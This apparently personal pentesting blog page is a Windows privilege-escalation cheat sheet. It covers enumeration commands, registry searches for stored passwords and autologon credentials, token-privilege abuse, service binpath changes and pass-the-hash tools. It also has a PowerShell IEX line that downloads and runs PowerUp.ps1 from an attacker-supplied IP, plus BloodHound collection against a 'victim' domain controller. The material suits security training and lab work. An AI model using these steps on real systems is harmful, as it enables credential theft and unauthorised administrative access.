<html>
<head>
    <title>Windows PrivEsc</title>
    <a href="https://pusher91.github.io/Blog/">Return to Main Page</a>
</head>

<hr>

<body>

    <h2>Manual PrivEsc:</h2>
    <li>Use rlwrap on shell to enable arrow usage (up and down to navigate previous commands, left and right to navigate text)</li>
    <li>Check user groups and privileges</li>
    <ul>
        <li>whoami</li>
        <li>whoami /all</li>
        <li>whoami /priv</li>
        <li>whoami /groups</li>
        <li>net user &lt;username&gt;</li>
        <ul>
            <li>Get info about a specific user</li>
        </ul>
    </ul>
    <li>Kernel exploit</li>
    <ul>
        <li>Google the last installed "hotfix + exploit"</li>
    </ul>
    <li>Check folders</li>
    <ul>
        <li>Look for interesting files</li>
        <li>C:\Users\*</li>
        <li>C:\Program Files\</li>
        <li>C:\Program Files (x86)\</li>
    </ul>
    <li>Autologon creds</li>
    <ul>
        <li>get-item -path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"</li>
        <li>reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
    </ul>
    <li>Check running processes, pay attention to admin</li>
    <ul>
        <li>tasklist /V</li>
        <li>Most application exploits are the same as other misconfigurations (weak folder configurations, unquoted service paths, etc)</li>
    </ul>
    <li>Open ports</li>
    <ul>
        <li>netstat -an</li>
        <ul>
            <li>Ports listening on local host</li>
            <li>Ones not listed during nmap scan/firewalled</li>
        </ul>
    </ul>
    <li>Look for Group Policy (GPP) passwords</li>
    <ul>
        <li>Installed programs/applications</li>
        <ul>
            <li>List applications that are installed by the Windows Installer</li>
            <ul>
                <li>wmic product get name, version, vendor</li>
            </ul>
        </ul>
    </ul>
    <li>Insecure Services</li>
    <ul>
        <li>AllAccess, Start</li>
        <ul>
            <li>Change binpath</li>
        </ul>
    </ul>
    <li>Startup Apps/autorun</li>
    <ul>
        <li>Important if we can reboot the box</li>
    </ul>
    <li>Privilege Abuse</li>
    <ul>
        <li>SeLoadDriverPrivilege</li>
        <li>SeImpersonatePrivilege</li>
        <li>SeImpersonatePrivilege</li>
        <li>SeAssignPrimaryPrivilege</li>
        <li>SeTcbPrivilege</li>
        <li>SeBackupPrivilege</li>
        <ul>
            <li>https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</li>
        </ul>
        <li>SeRestorePrivilege</li>
        <li>SeCreateTokenPrivilege</li>
        <li>SeLoadDriverPrivilege</li>
        <li>SeTakeOwnershipPrivilege</li>
        <li>SeDebugPrivilege</li>
        <li>Article on exploiting privileges:https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</li>
    </ul>
    <li>Always Install Elevated</li>
    <li>Abuse GUI Program running as admin</li>
    <ul>
        <li>Inside application open file: file://c:/windows/system32/cmd.exe</li>
        <ul>
            <li>Might get admin command prompt</li>
        </ul>
    </ul>
    <li>Look for exploits for 3rd party drivers</li>
    <ul>
        <li>Enumerate drivers</li>
        <ul>
            <li>driverquery /v</li>
            <li>Powershell - driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path</li>
        </ul>
        <li>Enumerate Driver Versions</li>
        <ul>
            <li>Powershell - Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</li>
        </ul>
    </ul>
    <li>Search the registry for keys and values that contain "password":</li>
    <ul>
        <li>reg query HKLM /f password /t REG_SZ /s</li>
        <li>reg query HKCU /f password /t REG_SZ /s</li>
        <li>reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"</li>
        <li>reg query "HKCU\software\simontatham\putty\sessions" /s</li>
        <li>reg query HKLM\System\ControlSet001\Control\CurrentPass</li>
        <li>reg query HKLM\System\ControlSet002\Control\CurrentPass</li>
        <li>HKLM\System\CurrentControlSet\Control\CurrentPass</li>
    </ul>
    <li>Scheduled Tasks</li>
    <ul>
        <li>schtasks /query /fo LIST /v</li>
    </ul>
    <li>mysql</li>
    <ul>
        <li>run commands as mysql user</li>
        <ul>
            <li>raptor_winudf</li>
        </ul>
        <li>Search for creds</li>
    </ul>
    <li>Login or run commands as other user using credentials or hashes</li>
    <ul>
        <li>Powershell</li>
        <li>psexec</li>
        <li>winrm</li>
        <li>wmiexec</li>
        <li>pth-winexe</li>
    </ul>
    <li>Check password attack vectors</li>
    <ul>
        <li>ASREPRoast</li>
        <li>Kerberoast</li>
    </ul>

    <br>

    <h2>PrivEsc Tools</h2>
    <li>Powerup.ps1</li>
    <ul>
        <li>IEX(New-Object Net.WebClient).downloadString('http://&lt;ip address&gt;/PowerUp.ps1&#039;)</li>
        <li>Invoke-AllChecks</li>
    </ul>
    <li>Winpeas</li>
    <li>Seatbelt</li>
    <li>Windows-Privesc-Checker</li>
    <li>Windows Exploit Suggester - Next Generation</li>
    <ul>
        <li>wesng.py /systeminfo.txt -i 'Elevation of Privilege' --exploits-only</li>
    </ul>
    <li>Metasploit</li>
    <li>Bloodhound</li>
    <ul>
        <li>Use against DC</li>
        <li>Clone repo for most up-to-date version</li>
        <ul>
            <li>Repo does not include the bloodhound executable, this must be downloaded separately from releases</li>
        </ul>
        <li>Usage instructions:</li>
        <ul>
            <li>Start neo4j on Kali</li>
            <ul>
                <li>run: neo4j console</li>
                <ul>
                    <li>Default credentials - neo4j:neo4j</li>
                    <ul>
                        <li>locate neo4j | grep auth</li>
                        <li>Delete Delete /usr/share/neo4j/data/dbms</li>
                    </ul>
                </ul>
            </ul>
            <li>Run collector/ingestor on victim AD DC machine</li>
            <ul>
                <li>Locally with executable: .\Sharphound.exe -c all</li>
                <li>Remotely using python: sudo python3 bloodhound.py -c all -u &lt;user&gt; -p &#039;&lt;password&gt;&#039; -ns &lt;ip&gt; -d &lt;domain name&gt; --zip</li>
            </ul>
            <li>Start bloodhound on Kali</li>
            <ul>
                <li>sudo ./Bloodhound --no-sandbox</li>
            </ul>
            <li>Drag and drop file generated by sharphound into Bloodhound window</li>
            <li>On top left where it says "Search for a node" enter the username that is being used on the victim machine</li>
            <li>right click icon in center with pwned victim machine user and "Mark User as Owned"</li>
            <li>Things to check under Queries/Analysis tab</li>
            <ul>
                <li>Shortest Paths from Kerberoastable Users</li>
                <li>Shortest path from Owned principles</li>
                <li>Shortest path to High Value Targets</li>
            </ul>
            <li>Can right click on account associations and select "Help" and it will give info how an AD association can be abused</li>
        </ul>
    </ul>
    <li>SharpCollection</li>
    <ul>
        <li>Common C# offensive tools that are checked for updates daily, and then compiled</li>
    </ul>










</body>
</html>